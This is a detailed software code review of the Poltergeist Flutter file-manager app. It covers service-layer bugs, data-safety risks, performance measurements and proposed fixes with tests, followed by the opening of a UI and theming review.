- **NFC on upload from macOS (opt-in per server).** Web servers and Linux tools expect NFC; macOS sources can hand out NFD names. A per-bookmark "normalize names to NFC on upload" toggle with a preview note, as Cyberduck offers. First slice: a transform in the walker's `plannedDest` join with a flagged row when it changes a name.
- **Transfer receipts.** Optionally write, per task, a JSONL manifest of (source path, destination path, size, mtime, sha256 when hashed) next to history, with an "export receipt" action. This makes the "did everything copy?" question answerable, especially after skips. First slice: the manifest for completed items only, reusing the journal's `fileCompleted` stream.
- **Chaos property test for moves.** A seeded random tree plus random fault injection (disconnect, ENOSPC, cancel, pause, crash-and-restore via the journal) over `FakeTreeFileSystem`, asserting the invariant that the union of source and destination (and trash) contains every original byte sequence exactly once or more. This would have caught P2-01 and P2-06 and guards future refactors. First slice: move-only, faults limited to disconnect and cancel.
- **rsync exporter self-check in CI.** Run the generated `rsync -n -i` against the existing sshd fixture with hostile names (space, `*`, quote, NFD, a `.poltergeist-trash` directory) and assert the itemized output matches the engine plan's actions. This turns the exporter's "no silent divergence" promise into a tested one.
- **Durable remote commits before deleting a local source.** For local→remote moves, call `fsync@openssh.com` (if dartssh2 exposes it; otherwise a Séance VFS addition) on the uploaded file before the post-commit source delete. This is the remote twin of D26's local flush barrier.

---

## P3 review: Poltergeist app services (non-visual logic)

Scope: `app/poltergeist_app/lib/services/**`, `lib/main.dart`, `lib/bench/**`
at `913ca3d` (main). Read-only on the repo; repros ran in a scratch copy
(`scratchpad/work-P3/Poltergeist`, `flutter test`, Flutter 3.47.2, JIT VM, so
timings are indicative: AOT release is typically 1.5-2x faster).

### 1. Summary

The service layer is unusually disciplined: stale-answer generations, `identical()`
channel checks, serialized write tails and fail-closed schema handling are
everywhere, and the pane controller's navigation state machine is sound as far as
I could trace it. The main risks sit at the edges between subsystems, and in cost
that grows with listing size:

- **Data safety across stores.** A quarantined `bookmarks.json` wipes every saved
  workspace's device-local detail (reproduced). A transient read error on
  `vault.json` or `host_keys.json` is treated as corruption, so the file is moved
  aside and the vault starts empty. A pane rename never migrates managed
  checkouts, so an external-editor save then hits a false "changed or deleted"
  conflict. Recents overwrite a newer-schema document (reproduced).
- **Missing specified behavior.** Bookmark backup never runs on its own. The
  04 §3.3 schedule (startup, 2 s debounce, 5 min periodic, queued round) is
  unimplemented, so enrolled users are backed up only when they press a button.
- **UI-isolate cost at 50k-100k rows.** The session document persists every
  tab's full listing inside `settings.json` (6.9 MB for one 50k tab). That
  document is re-encoded after every cursor pause, and any unrelated preference
  write then costs about 290 ms. Each filter keystroke on 100k rows takes about
  300 ms, mostly because type-ahead folds are recomputed eagerly.
- **Preview.** Quick Look's confirm card starts nothing when the Info well is
  visible (the app default). The overlay then wedges, and its Cancel cancels
  unrelated background productions (reproduced).

### 2. Findings

| ID | Title | Sev | Category | NEW/KNOWN | Confidence | Effort |
|---|---|---|---|---|---|---|
| P3-01 | Quick Look "Download" diverts to the Info well's confirm card; overlay wedges; Cancel kills background productions | P2 | bug | NEW | REPRODUCED | S |
| P3-02 | Session/workspace documents persist full listings in settings.json; UI-isolate encode on every pane notify | P2 | performance | NEW | VERIFIED + measured | M |
| P3-03 | Filter keystroke / sort / hidden toggle recompute type-ahead folds + row keys for the whole listing (~300 ms @100k) | P2 | performance | NEW (related KNOWN item 15) | VERIFIED + measured | M |
| P3-04 | Pane rename never calls `CheckoutManager.migrateRename` | P2 | stability/data-safety | NEW | VERIFIED | S-M |
| P3-05 | Vault / pin store quarantine the file on a transient *read* error; pin store writes unserialized | P1 | stability/data-safety | NEW | LIKELY | S |
| P3-06 | Automatic bookmark backup scheduling (04 §3.3) is not implemented | P2 | missing-feature | NEW | VERIFIED | M |
| P3-07 | A quarantined bookmarks.json permanently erases all saved-workspace details | P2 | stability/data-safety | NEW | REPRODUCED | S |
| P3-08 | Sync plan diff (contentHash) is not cancellable; superseded scans write state after awaits | P2 | performance/bug | NEW | VERIFIED | S |
| P3-09 | Recents overwrite a newer-schema / malformed document on first navigation | P3 | bug | NEW | REPRODUCED | S |
| P3-10 | Activity panel notifies on every per-chunk progress event; the inspector rebuilds its whole column and alerts re-derive | P3 | performance | NEW | LIKELY | M |
| P3-11 | `DynamicSecretVault` probes (and may mint) the keystore key on every call; concurrent first mints race | P3 | stability | NEW | LIKELY (narrow) | S |
| P3-12 | Credential prompt saves the typed secret to the vault before auth succeeds | P3 | UX/data-safety | NEW | VERIFIED (code) | S |

---

#### P3-01: Quick Look "Download" diverts to the Info well's confirm card; overlay wedges

- **Severity:** P2. **Category:** bug. **Status:** NEW. **Confidence:** REPRODUCED.
- **Location:** `lib/services/preview_session.dart:833-857` (`_startProduction`), `:1218-1223` (`quickLookConfirm`), `:615-640` (`_cancelProduction`), `:469-480` (`_quickLookVerb`), `:511-514` (Esc on producing).
- **Evidence:** `_startProduction` decides the up-front threshold gate from the *panel's* phase:
  ```dart
  if (_phase == PreviewPhase.prompt && size != null && size > threshold) {
    _confirmBytes = size;
    _setPhase(PreviewPhase.confirm);
    return;
  }
  ```
  `quickLookConfirm()` sets `_quickLookCard = producing` and calls `_startProduction` after the user already confirmed on the overlay. With the Info tab visible (the default: `workspace_controller.dart:109` `_inspectorTab = InspectorTab.info`, inspector shown on desktop), `_evaluateRemote` has put the well in `prompt` for an uncached remote text file, so the call returns early and no production starts.
  - The overlay keeps showing "Downloading… 0 B". Its Cancel (`cancelProduction`) finds no production for the focused key and no pending start. It falls through to `for (final production in _productions.values) _producer?.cancel(...)`, which cancels background productions the design says must keep filling the cache, and never clears `_quickLookCard`.
  - Space is then a no-op (`_quickLookVerb` returns early while `_quickLookCard != none`).
- **Repro (scratch test):** `PreviewHarness.create(platform: macOS, quickLookAvailable: true, thresholdBytes: 8, infoTabShown: true)` over `previewEntry('big.txt', size: 900)` gives `previewFocused()` → confirm card → `quickLookConfirm()`. Output: `after confirm: card=producing phase=confirm specs=0`; after Esc, still `card=producing specs=0`.
  - Existing coverage misses it for two reasons. The suite defaults `infoTabShown: false`. The one QL-confirm test (`preview_session_test.dart:712`) uses `big.bin`, a metadata kind whose well phase is `rendered`, never `prompt`.
- **Failure scenario:** On macOS, Linux or Windows, press Space on a 150 MB remote `server.log` (text kind; over the 100 MiB default threshold, under the 512 MiB cache cap) and click Download. Nothing downloads, and the Info well silently flips to its own confirm card. The overlay stays up with a dead progress line until the selection moves, and its Cancel aborts other previews' downloads.
- **Fix:**
  1. Pass the gate decision explicitly: `_startProduction({required int generation, required _ThresholdGate gate})` with `enum _ThresholdGate { ask, confirmed }`.
     - `_panelVerb`'s prompt leg and `confirmDownload`'s prompt leg pass `ask`.
     - `confirmDownload`'s confirm leg and `quickLookConfirm` pass `confirmed`.
     - `_quickLookProduce`'s under-threshold start passes `confirmed`, since it already decided.
  2. In `_cancelProduction`, when nothing was cancelled (no focused production and no pending start), clear a non-`none` `_quickLookCard`, reset `_quickLookRequested = _quickLookActive` and notify, rather than cancelling every production. Keep the "cancel all" fallback only if the product actually wants it; the design text says focus changes never cancel.
- **Regression tests (write first):**
  - The repro above, asserting `producer.specs.isNotEmpty` and `quickLookCard == producing` with progress.
  - A second test with a background production on another row: Cancel on a wedged card leaves `producer.cancels` empty.
  - Parameterize the existing QL suite over `infoTabShown: true/false`.
- **Effort:** S.

#### P3-02: Full listings persisted in settings.json and re-encoded on the UI isolate

- **Severity:** P2. **Category:** performance (plus a privacy note). **Status:** NEW. **Confidence:** VERIFIED + measured.
- **Location:**
  - `lib/services/pane_controller.dart:2835-2861` (`captureSessionTab` passes `listing: _sortedListing`).
  - `session_state.dart:89-91` (every entry serialized, uncapped).
  - `pane_tabs_controller.dart:453-465` (`captureSession`), `:491-503` (`captureWorkspacePane` persists listings into saved workspaces too), `:922-924` (every tab notify forwards to the strip).
  - `session_persistence.dart:73-86` (listens to both strips), `:128-155` (capture + full `jsonEncode` for dedupe).
  - `session_state_store.dart:61-73` (read-before-write re-decodes every stored listing).
  - `settings_store.dart:143-145` (every `set` of any key re-encodes the whole map).
- **Evidence (measured, scratch bench):**
  - A 50,000-entry local tab makes `settings.json` 6,917,072 bytes; the first session write takes 422 ms.
  - A cursor move, which is selection-only and dedupes to no disk write, still costs 82 ms of capture + `jsonEncode` on the UI isolate after the 400 ms debounce.
  - An unrelated `SettingsStore.set('layout.paneRatio', …)` takes 291 ms.
  - Encode alone is 196 ms and decode+validate 379 ms for 10.5 MB of entries.
- **Failure scenario:** Open `node_modules/.pnpm` or a 50k-file log directory in one tab.
  - Every pause after arrow-key navigation, filter typing or a folder-size progress tick causes a roughly 100 ms UI stall (AOT estimate). Every splitter drag end, sidebar collapse, pin or theme change stalls for about 150-300 ms and rewrites 7 MB to disk.
  - Saved workspaces snapshot the same listings forever.
  - Remote file names from every server the user browsed sit in plaintext in `settings.json` and in saved workspace documents.
- **Fix (two steps):**
  1. **Cap (small PR).** In `captureSessionTab`, persist at most `kSessionListingCap` (for example 200) rows of `_sortedListing` for remote tabs and none for local tabs, which "rebind live on activation regardless" (STATUS M3 restore). Add a `listingTruncated`/`listingTotal` field so the restored rows can say "and N more". Workspaces (`captureWorkspacePane`) should persist no listing at all: they restore by rebinding.
  2. **Structural.** Keep the cached listing out of `settings.json`: move it to a `session-cache/<paneTabId>.json` sidecar written with `writeStringAtomically`. Replace encode-for-dedupe with a cheap persisted-state revision that the controller bumps only on location/tab/listing changes, so selection-only notifies do not trigger a capture.
- **Tests:**
  - `session_persistence_test`: 5k rows gives a persisted listing length of at most the cap, and a local tab persists none.
  - A cursor-only change does not call `captureSessionTab` (spy strip).
  - `workspace_state` round trip without listings.
- **Effort:** M. The cap alone is S.

#### P3-03: Filter keystrokes and lens changes redo O(n) folds and keys (~300 ms @100k)

- **Severity:** P2. **Category:** performance. **Status:** NEW. KNOWN item 15 covers Quick Select folding only. **Confidence:** VERIFIED + measured.
- **Location:** `pane_controller.dart:3749-3784` (`_applyEntries`: eager `typeAheadFold` for every visible row at `:3768-3771`, fresh `_keysFor` + `_rowKeyIndex` map at `:3772-3773`), `:2911-2916` (`setFilterQuery`), `:1727-1781` (`showHidden`, `setSort`), `:4157-4175` (`_hiddenFiltered` sorts on the UI isolate), `:3659` (accept sorts on the UI isolate).
- **Evidence (100k rows like `file-123-résumé.txt`):**
  - `typeAheadFold` alone takes 121 ms per pass.
  - Filter "f", "fi", "fil" take 313, 321 and 268 ms; clearing the filter takes 250 ms.
  - Sort by size takes 355 ms; open+accept takes 615 ms.
  - A cursor move takes 1 ms.
  - The header filter (D32 §4) calls `setFilterQuery` per keystroke, so each character stalls the UI. Budget P2 in 02 §12 targets 100k-row listings.
- **Failure scenario:** On a 100k-entry directory, typing in the header filter drops about 20 frames per keystroke (JIT) or about 10 (AOT estimate), and focus-lag makes the field feel broken.
- **Fix:**
  1. Make `_foldedNames` lazy: null it in `_applyEntries` and build it on the first `typeAhead` call. Type-ahead is rare; filtering is common.
  2. Compute row keys once per accepted listing (`Map<RemoteFileEntry, _RowKey>` or a parallel list for `_sortedListing`, keyed by index) and project them through the hidden/filter/sort lenses instead of rebuilding `occurrences` per keystroke. Occurrence ordinals are only needed for uniqueness, so full-listing ordinals are fine.
  3. Add an ASCII fast path in `typeAheadFold`: when every rune is below 0x80, lowercase with bit arithmetic and skip the table.
  4. Above a threshold (for example 20k rows), run `sortFileEntries` in `Isolate.run` at accept and sort time, behind the existing generation check.
- **Tests:** A pane test asserting that `typeAheadFold` is not invoked during `setFilterQuery` (inject a fold counter or expose a debug counter). Add a D12 tier-B micro-bench, "filter keystroke @100k < 50 ms (release)", next to P2.
- **Effort:** M.

#### P3-04: Pane rename never migrates managed checkouts

- **Severity:** P2. **Category:** stability/data-safety. **Status:** NEW. **Confidence:** VERIFIED.
- **Location:** `pane_controller.dart:1980-2146` (`submitRename`: `channel.rename` at `:2092`, no hook), `checkout_session.dart:143-151` ("The pane's rename command calls this"). `grep migrateRename lib/` finds only the definition. Spec: `docs/plan/06-EDITOR.md` §3.5 ("when a pane renames a remote file or directory, `CheckoutManager.migrateRename` rewrites the record").
- **Evidence:** After a rename the record still names the old `remotePath`. On the next upload-on-save, `CheckoutManager._upload` (core `checkout_manager.dart:447-462`) stats the old path, gets null, and throws a `conflict` ("changed or was deleted on the server after it was opened locally").
- **Failure scenario:** Open `config.yml` from a remote pane in VS Code (managed checkout), rename it in Poltergeist to `config.prod.yml`, then save in VS Code. The user gets a conflict for a file nobody changed. Choosing Overwrite resurrects `config.yml` next to the renamed file; choosing Discard throws away the edit. Renaming a parent directory affects every checkout under it the same way.
- **Fix:** Add `Future<void> Function(String serverId, String oldPath, String newPath)? onRemoteRenamed` on `PaneController`. The strip stamps it like `externalEditorOpen`, and the shell binds it to `checkoutSession.migrateRename`.
  - In `submitRename`, after a successful `channel.rename` on a remote binding (`_pendingRemote != null`), call it whether or not `ownsPresentation()` holds, because the rename landed either way.
  - Report errors via `_report`.
  - Same-server moves through the queue need the same hook on the core side; flag them as a follow-up.
- **Tests:**
  - A pane test with a fake hook asserting `(srv, '/a/config.yml', '/a/config.prod.yml')` after a remote rename.
  - No call for local panes or a failed rename.
  - A call even when the pane navigated away mid-rename.
- **Effort:** S-M.

#### P3-05: Vault / pin store treat a transient read error as corruption

- **Severity:** P1. **Category:** stability/data-safety. **Status:** NEW. **Confidence:** LIKELY (code trace; the trigger is environmental).
- **Location:** `lib/services/file_stores.dart:112-131` (`FileVaultStore._read`), `:358-373` (`FileHostKeyStore._load`), `:393-397` (`put`, unserialized). Also the comment at `:178` claims `writeStringAtomically` has a "per-path queue". `atomic_file.dart` in this repo has none.
- **Evidence:**
  ```dart
  try {
    final map = jsonDecode(await file.readAsString()) as Map;
    ...
  } catch (_) {
    _blobs.clear();
    await _quarantineCorruptFile(file);
  }
  ```
  The read sits inside the catch-all, so `FileSystemException` (Windows sharing violation from AV or an indexer, an EACCES after the app once ran elevated, an EIO) quarantines `vault.json`. `_load` then memoizes the empty result for the session, and the next `putSecretBlob` writes a fresh vault containing only the new secret.
  - The same file's re-key journal reader (`:151-173`), `SettingsStore._load` and core `FileBookmarkStore._load` all deliberately let read failures propagate. They quarantine only after a decode failure.
  - `FileHostKeyStore` has the same pattern (all TOFU pins dropped, so every host prompts as first-use). Its `put` flushes concurrently from three owners (engine mirror `_pinTail`, backup coordinator, server editor): each write snapshots the map at call time and the last rename to land wins. The loss persists only until the next pin write re-flushes the whole map.
- **Failure scenario:** On Windows, Defender holds `vault.json` briefly after the previous session's atomic rename. First connect: every saved password "disappears" (moved to `vault.json.corrupt-…`) and the next saved credential overwrites the vault. Recovery requires a manual rename that most users won't know about.
- **Fix:**
  1. Move `await file.readAsString()` (or better, `readAsBytes` plus `utf8.decode` inside the guard, as the journal does) outside the quarantine `try`, so I/O errors propagate. `_load()` already un-memoizes failures, so a later call retries.
  2. Apply the same split to `FileHostKeyStore._load`, and serialize `put` with a `_tail` like `FileVaultStore._serialize`.
  3. Fix the stale comment.
  4. Port back to Séance: identical code in `Seance/app/seance_app/lib/services/file_stores.dart:305-314`.
- **Tests:** Inject a reader seam (or a `File` subclass whose `readAsString` throws `FileSystemException`). Assert that `getSecretBlob` throws, no `.corrupt-*` file exists, the original bytes are intact, and a second call after the fault clears returns the secret. For `FileHostKeyStore`, concurrently `put(A)` and `put(B)` with a delayed first writer, then reload and assert both pins.
- **Effort:** S.

#### P3-06: Automatic bookmark backup scheduling is unimplemented

- **Severity:** P2. **Category:** missing-feature (data-safety). **Status:** NEW (not in the STATUS open items). **Confidence:** VERIFIED.
- **Location:** `bookmark_backup_service.dart:7-9` ("Scheduling (startup, 2 s debounce, 5 min periodic, queued flag) is a later slice"), `:512-550` (`backUpNow` returns null while `_syncing`: no queued round). The only callers are the Settings button and the sidebar's "Sync now" (`workspace_shell.dart:3478-3484`). Spec: `docs/plan/04-SEANCE-INTEGRATION.md` §3.3 and its checklist item at `:1609`.
- **Failure scenario:** A user enrolls, then adds or edits 30 bookmarks over a month without pressing "Back up now" and loses the laptop. The backup holds only the enrollment-time state. Also, an edit made during a round is never pushed until the next manual press, because there is no queued flag.
- **Fix:** Add a scheduler inside `BookmarkBackupService`:
  - Run on `load()` when enrolled (startup).
  - Subscribe to `bookmarks.changes` and the server store's changes with a 2 s debounce.
  - Add `Timer.periodic(5 min)`.
  - Add a `_roundQueued` flag: `backUpNow` during a round sets it, and the round loops once more.
  - Pause while `passphraseUnverified`, signed out or on a dead-account notice. Cancel timers in `dispose` and sign-out.
  - Keep failures silent in the UI except for manual rounds (spec).
- **Tests:** Fake clock with an injected `Timer` factory. Assert a startup round; debounce coalescing of three edits into one round; a periodic tick; a mid-round edit producing exactly one follow-up round; no rounds after sign-out.
- **Effort:** M.

#### P3-07: A quarantined bookmarks.json erases every saved workspace's details

- **Severity:** P2. **Category:** stability/data-safety. **Status:** NEW. **Confidence:** REPRODUCED.
- **Location:** `workspace_library.dart:162-171` (load-time prune: "a detail whose favorite is gone is a deleted row's residue … never a workspace to resurrect"), plus core `bookmark_store.dart:733-751` (corrupt file: quarantine and start empty).
- **Repro (scratch test):** Save workspace "Client X", corrupt `bookmarks.json` (torn write), then construct a new `WorkspaceLibrary` and call `load()`.
  - Before: 475 bytes of details.
  - After: `{"version":2,"workspaces":[]}`.
  - Only `bookmarks.json.corrupt-…` remains.
- **Failure scenario:** One damaged `bookmarks.json`, from a crash or a sync-folder conflict, and then *restoring* it (by hand, or by re-pulling favorites from backup) brings the workspace favorites back as placeholders only. The device-local tab sets were deleted and are never synced. The cascade turns a recoverable fault into permanent loss.
- **Fix:** Do not prune on load. Orphaned details stay in the document, invisible because `workspaces` joins on bookmarks. Removal happens only on an observed `BookmarkRemovedChange` (already handled in `_onStoreChange`) or an explicit delete. If orphan GC is wanted, gate it on a store signal that the load was clean (for example `FileBookmarkStore.lastLoadQuarantined == false`) plus an age threshold.
- **Test:** The repro above, asserting the detail survives and reappears once a bookmark with the same id is restored.
- **Effort:** S.

#### P3-08: Sync plan diff is not cancellable; superseded scans keep writing state

- **Severity:** P2. **Category:** performance/bug. **Status:** NEW. **Confidence:** VERIFIED.
- **Location:** `sync_plan_controller.dart:280-290` (`SyncPlanDiffer.diff` has no cancellation parameter), `:1417-1440` (`_EngineDiffer` never passes one, although core `poltergeist_sync/lib/src/diff.dart:36,73` checks `cancellation` between content hashes), `:865-963` (`_scanAndDiff`), `:1374-1381` (dispose cancels only `_scanCancellation`).
- **Evidence:**
  - In `contentHash` mode, `diffScans` streams SHA-256 for every size-equal pair on both sides.
  - `rescan()`, `setMode`, `updateRules`, `acceptHeavySuggestion` and closing the tab (dispose) cannot stop it.
  - After `await states.load(...)` (`:891`, `:916`) and `await states.save(...)` (`:922`) there is no generation check. The superseded scan applies and clears `_pendingCaseOverrides` (`:923`) that a newer `updatePairDefinition` set, and saves them under the old pairId.
  - The override-mismatch branch reads the field `_scanCancellation!` after awaits (`:902-911`), so a superseded scan can run a full second pair of scans on the newer scan's (uncancelled) token.
  - `run()` (`:1073`) does not require `phase == ready`.
- **Failure scenario:** On a contentHash pair over a 20 GB photo tree, the user toggles "Include hidden files". The old diff keeps hashing both trees to completion while the new scan runs, doubling remote I/O. Closing the tab doesn't stop it either. In a separate race, saving the pair editor during the load/save window silently drops the case-sensitivity override.
- **Fix:**
  1. Capture `final cancellation = ScanCancellation();` locally in `_scanAndDiff` and use it everywhere.
  2. Add `ScanCancellation? cancellation` to `SyncPlanDiffer.diff` and forward it in `_EngineDiffer`.
  3. Insert `if (_disposed || generation != _scanGeneration) return;` after each `states.load`/`states.save` await, and clear `_pendingCaseOverrides` only when current.
  4. Guard `run()` with `_phase == SyncPlanPhase.ready || _phase == completed/failed/cancelled`, never `scanning`.
- **Tests:**
  - A stub differ that awaits a completer and records the cancellation it received: `rescan()` sets `isCancelled`, and so does `dispose()`.
  - `updatePairDefinition` issued while a stub `states.load` is parked keeps the overrides on the new pairId.
- **Effort:** S.

#### P3-09: Recents overwrite a newer-schema document

- **Severity:** P3. **Category:** bug. **Status:** NEW. **Confidence:** REPRODUCED.
- **Location:** `recent_locations.dart:86-92` (the documented contract "never overwritten unread"), `:125-157` (a version mismatch is swallowed and the list starts empty), `:208-231` (`_write` sets v1 unconditionally).
- **Repro:** Seed `{"quickOpen.recentLocations":{"version":2,...}}`, call `load()`, record one location, flush. The stored value becomes `{version: 1, entries: [{label: tmp, path: /tmp}]}`.
- **Failure scenario:** After a downgrade (running v1.x after a newer build), the first folder visit destroys the newer build's recents, and any fields it added.
- **Fix:** Track `_blockedBySchema = true` when the stored document is present but undecodable, and skip `_write` in that case. Alternatively, re-read and validate in `_write` like `SessionStateStore.save`.
- **Test:** The repro, asserting the version stays 2.
- **Effort:** S.

#### P3-10: Per-chunk progress drives root notifiers

- **Severity:** P3. **Category:** performance. **Status:** NEW. **Confidence:** LIKELY (traced, not profiled).
- **Location:** `activity_panel_controller.dart:372-385`, `alert_center.dart:159-184`, `ui/inspector/inspector_view.dart:85-96`, core `transfer_queue.dart:3054-3075` (`_onFileProgress` emits an event per chunk, with no throttle).
- **Evidence:**
  - Every `TransferQueueProgressEvent` runs `_checkTasksArrived()` (O(tasks)) and `_rateTracker.prune({for (task in tasks) task.id})` (a set built per event), then `notifyListeners()`.
  - `AlertCenter._changed` re-collects every task, checkout and connection whenever any alert has been dismissed.
  - The inspector's `ListenableBuilder(merge[workspace, alerts, activity])` rebuilds the whole column, including the Info preview well, at frame rate for the entire transfer. This is per window.
  - It contradicts 02 §12's "transfer progress events never route through a root notifier".
- **Fix:** Split `ActivityPanelController` into a structural notifier (tasks added, removed, state changes) and a progress `ValueListenable<int>` tick throttled to about 10 Hz. Have `AlertCenter` listen to the structural notifier only. Move `prune` to task-removal time. The inspector tab switcher can read live counts from the structural notifier.
- **Test:** Emit 1,000 progress events and assert the structural listener fires 0 times while the tick fires 10 times or fewer per second (fake clock).
- **Effort:** M.

#### P3-11: Keystore probe per vault call; concurrent first mint race

- **Severity:** P3. **Category:** stability. **Status:** NEW. **Confidence:** LIKELY, but the window is narrow.
- **Location:** `main.dart:119-126` (`DynamicSecretVault` calls `masterKeys.probeKeystore()` per operation), `secure_master_key.dart:95-111` (read null, then mint and write a random key). `bookmarkBackup.vaultKey` is also `probeKeystore`.
- **Failure scenario:** On a fresh install whose keyring was locked at launch (Linux auto-login), the startup probe mints nothing. After the user unlocks, two concurrent vault operations can each read null, each mint a different key and each write it. A secret sealed under the losing key is unreadable forever and reads as absent. Separately, every credential read performs an OS keystore round trip.
- **Fix:** Single-flight the mint in `MasterKeyManager.probeKeystore()`: a memoized `Future` for the create path, re-read after the write, and return the stored value. Cache the resolved key in `DynamicSecretVault` until `setKeystoreKey` bumps a revision.
- **Test:** A fake storage returning null on the first two reads; two concurrent probes resolve to the same key and exactly one write happens.
- **Effort:** S.

#### P3-12: Typed secret saved before authentication succeeds

- **Severity:** P3. **Category:** UX/data-safety. **Status:** NEW. **Confidence:** VERIFIED (code).
- **Location:** `prompt_coordinator.dart:333` (`if (result.saveToVault) await _saveToVault(data, result);` runs before the reply is used to authenticate).
- **Failure scenario:** A stored, correct password fails once (for example a PAM hiccup), and the prompt appears. The user mistypes with "Save" checked. The known-good secret is overwritten by the typo, and later connects fail silently until the user notices.
- **Fix:** Defer the vault write until the engine reports auth success for that resolution. The coordinator can keep the pending save keyed by the prompt id and commit it on the pool's `connected` status for that serverId. Alternatively, save to a staging id and promote it.
- **Test:** A coordinator test with a fake pool: an auth failure after the prompt means `vault.putSecret` is never called; success means it is called once.
- **Effort:** S-M.

#### Test gaps observed

- The preview suite defaults to a hidden inspector (`support/preview_harness.dart:184`), so every Quick Look plus visible-well combination (the app default) is untested (P3-01).
- No test covers the schema preservation contract of `RecentLocationsStore` (P3-09) or workspace-detail survival across a bookmark-store quarantine (P3-07).
- No test distinguishes read failure from decode failure for `FileVaultStore`/`FileHostKeyStore` (P3-05).
- No test pins rename-to-checkout migration (P3-04) or backup scheduling (P3-06).
- There is no large-listing interaction benchmark. Tier-B P2 measures first paint only, not filter keystrokes or session writes (P3-02, P3-03).

### 3. Best PR candidates

1. **P3-01, Quick Look confirm and wedged overlay (S, about 120 lines).** Start with the scratch repro as a failing test in `preview_session_test.dart` (`infoTabShown: true`, `big.txt`), plus a "Cancel on a wedged card cancels nothing else" test. Then add the `_ThresholdGate` enum argument to `_startProduction` and update its five call sites. Finally, make the `_cancelProduction` fallback clear the Quick Look card instead of cancelling every production. Re-run the whole preview suite parameterized over `infoTabShown`.
2. **P3-05, vault/pin read vs decode split plus serialized pin writes (S, about 150 lines).** Tests first: an injectable failing reader asserts no quarantine and a retry on the next call; concurrent `put`s both survive a reload. Move the reads out of the quarantine guards, add `_tail` serialization to `FileHostKeyStore`, and fix the stale per-path-queue comment. Record a port-back note for Séance's identical code in PORTS/STATUS.
3. **P3-07, stop the load-time workspace-detail prune (S, about 80 lines).** Test first with the scratch repro (corrupt `bookmarks.json`, then assert the detail survives and rejoins when the bookmark returns). Remove the v2 prune branch, or gate it on a clean-load signal plus age. Deletion stays on the observed `BookmarkRemovedChange` path.
4. **P3-09, recents fail-closed (S, about 40 lines).** Test first: a version-2 document survives a `record()` plus `flush()`. Add a `_schemaBlocked` flag set in `_readPersisted` when a stored document is present but rejected, and make `_write` a reported no-op while it is set. This matches `SessionStateStore`/`WorkspaceListStore`.
5. **P3-04, rename migrates checkouts (S-M, about 150 lines).** Test first: a remote `submitRename` invokes the new `onRemoteRenamed(serverId, old, new)` hook, including when the pane moved on mid-rename; local and failed renames do not. Wire the hook in the strip and shell to `checkoutSession.migrateRename`, and add a shell-level test using the existing `checkout_session_test` fakes.
6. **P3-02 step 1, cap persisted listings (S, about 100 lines).** Test first: a 5k-row remote tab persists at most 200 rows with `listingTotal: 5000`, a local tab persists none, and workspace snapshots carry none. Implement the cap in `captureSessionTab`, drop listings from `captureWorkspacePane`, and add the truncation field to `SessionTabState` (optional on decode, so older documents still load). The sidecar and revision-counter work can follow as its own PR.

### 4. Ideas

- **Viewport-exact restore.** Instead of N rows, persist the rows visible at quit plus the scroll offset and cursor row name. The restored tab then looks exactly as the user left it, at a few KB. First slice: record `firstVisibleIndex`/`visibleCount` from the pane view into the tab state and persist that window.
- **Rename-aware relocation across stores.** One `LocationRenamed(serverId?, old, new)` event updates managed checkouts, recents, view preferences (`ViewPreferencesStore` keys), session tabs and bookmarks pointing into a renamed directory, so nothing points at a ghost path. First slice: fan the P3-04 hook out to `RecentLocationsStore.relocate(prefix)`.
- **ASCII fast lane for folds and filters.** Most file names are ASCII, and a one-pass `codeUnits.every(<0x80)` check lets filter lowercase and type-ahead fold skip the 9k-entry table. First slice: an ASCII branch in `typeAheadFold` with a property test against the table path.
- **Backup heartbeat chip.** Once P3-06 lands, a tiny sidebar footer ("Backed up 2 min ago", or an amber "Backup paused: passphrase unverified") that clicks through to Settings → Backup. First slice: expose `nextRoundAt` and `lastSyncAt` on the service.
- **Quick Look next-row prefetch (backlog item).** While a remote item previews, pre-produce the next row under the cache cap if it is under a small size (for example 2 MB), so arrow-stepping feels instant. First slice: prefetch only text kinds of 256 KB or less, cancel on focus change, and route through the existing dedupe map.
- **Transfer progress "sparkline" per task.** `TransferRateTracker` already keeps a 5 s window. Rendering it as a 40 px sparkline in the Transfers row, driven by the throttled tick from P3-10, makes stalls visible at a glance.

---

## P4 — Poltergeist Flutter UI and theming review

Scope: `app/poltergeist_app/lib/ui/**` and `lib/theme/**` at `913ca3d`
(main). Method: code reading, plus a scratch copy under
`scratchpad/work-P4/` where I ran four throwaway widget tests
(`test/zz_p4_verify_test.dart`, `zz_p4_perf_test.dart`,
`zz_p4_capture_test.dart`) against the real `PoltergeistApp`/`WorkspaceShell`
with the repo's `FakeAppEngine`. Screenshots (Roboto + Material Icons loaded)
are in `scratchpad/work-P4/shots/`: 1440x900 light/dark, 1024x700,
760x600, 1024 at 2x text, 1440 at 1.5x text, an 800x1280 Android tablet, and
360x800 phones at 1x and 2x, plus `*-sel.png` variants with a selection in
both panes and a live type-ahead badge. macOS captures render the system face
as boxes, so they show layout only.

### 1. Summary

The UI layer is carefully built and heavily commented. Listings are
virtualized with a fixed extent, the sidebar kit is mature (keyboard nav,
focus rings, semantics actions), the menus render from the registry (with a
signature cache so the macOS bar does not re-sync), the theme derives every
slot with contrast floors, and the compact phone posture is solid. Across all
tested sizes and text scales I found no overflow exceptions.

The biggest risks are in daily keyboard and navigation flow, not crashes:
- **Keyboard focus gets stranded.** Esc or Enter in the header filter leaves
  focus on the route scope, so arrow keys do nothing until you click.
- **Navigation loses your place.** ⌘↑ / Backspace / Back scroll the parent to
  the top and select nothing, so the folder you came from is not selected.
- **Missing listing keys.** PageUp/PageDown and numpad Enter do nothing.
  Backspace during type-ahead jumps to the parent folder.

The main visual issue is that names truncate at the end, so
`photo_…_41.jpeg` and `photo_…_42.jpeg` look identical and the extension is
hidden. On tablets and half-screen desktop windows the inspector overlay
covers most of pane B by default.

Other items:
- **Cross-platform.** An Android tablet has no back handling. There is no
  mouse back/forward button support. Dates are always US `M/d/yyyy h:mm AM`,
  whatever the OS region or 24-hour setting.
- **Performance.** Listeners are broad, so every cursor move rebuilds the
  header, the ☰ tree, the filter field and the whole Info tab.
- **Accessibility.** The focus indicator on InkWell controls is a tint of
  about 1.3:1.
- **Top missing feature.** Copy/Paste of files (⌘C/⌘V) is a known deferral
  that a Transmit/ForkLift user will miss first.

### 2. Findings

| ID | Title | Sev | Category | Status | Conf. |
|---|---|---|---|---|---|
| P4-01 | Esc/Enter in the header filter strands keyboard focus; no ↓ back to the listing | P2 | bug / UX | NEW | VERIFIED (test) |
| P4-02 | Going up or back loses your place: the folder you came from is not selected and the view jumps to the top | P2 | UX | NEW | VERIFIED (test) |
